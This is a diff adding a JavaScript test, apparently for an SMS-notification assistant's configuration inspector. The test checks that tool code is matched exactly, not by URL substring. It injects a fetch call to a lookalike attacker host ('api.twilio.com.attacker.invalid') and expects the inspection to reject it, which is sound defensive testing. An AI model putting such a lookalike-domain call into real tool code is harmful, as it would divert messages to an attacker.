@@ -104,6 +104,13 @@ test('configuration inspection rejects absent or wrong duplicate-dispatch protec
  tool.environmentVariables=tool.environmentVariables.filter(v=>v.name!=='SMS_NOTIFICATION_DISPATCH_URL');
  assert.equal(inspectIsolatedConfiguration({assistant:value,tool,aiNumber,ownerNumber}).checks.durableDispatchProtected,false);
 });
+test('configuration inspection requires exact owned draft code, not a URL substring check',()=>{
+ const tool=hydratedTool(),value=assistant();
+ const inspect=()=>inspectIsolatedConfiguration({assistant:value,tool,aiNumber,ownerNumber}).checks.ownedDraftCodeInstalled;
+ assert.equal(inspect(),true);
+ tool.code += "\nfetch('https://api.twilio.com.attacker.invalid/send');";
+ assert.equal(inspect(),false);
+});
 
 test("tool confirmation accepts natural approval without accepting ambiguity", () => {
   const conditions = toolRejectionPlan().conditions[0].conditions;
